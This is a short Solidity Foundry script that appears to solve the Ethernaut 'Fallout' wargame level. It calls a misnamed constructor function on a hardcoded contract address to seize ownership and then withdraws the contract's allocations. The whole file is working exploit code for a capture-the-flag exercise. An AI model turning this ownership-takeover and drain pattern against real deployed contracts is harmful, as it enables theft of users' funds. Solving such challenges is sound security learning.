//SPDX-License-Identifer;
import {Script,console} from "forge-std/Script.sol";
import {TestFallout} from "../test/TestFallout.t.sol";

pragma solidity ^0.8.18;


interface IFallOut {
    function Fal1out() external payable;

    function owner() external view returns (address);

    function allocate() external payable;

    function sendAllocation(address payable allocator) external;

    function collectAllocations() external;

    function allocatorBalance(
        address allocator
    ) external view returns (uint256);
}

contract HackerFallout is Script{

    IFallOut fallout_sol;

    function run() external{

       address targetAddress = 0x6A2D0cAfc48024C4a618607cC6FD3BB72D668c03; 
       fallout_sol = IFallOut(targetAddress);

       vm.startBroadcast();

       console.log("Original Owner", fallout_sol.owner());
       fallout_sol.Fal1out{value: 1 wei}();
       console.log("Contract Hacker successfully", fallout_sol.owner());

       fallout_sol.collectAllocations();
       vm.stopBroadcast();

    }
}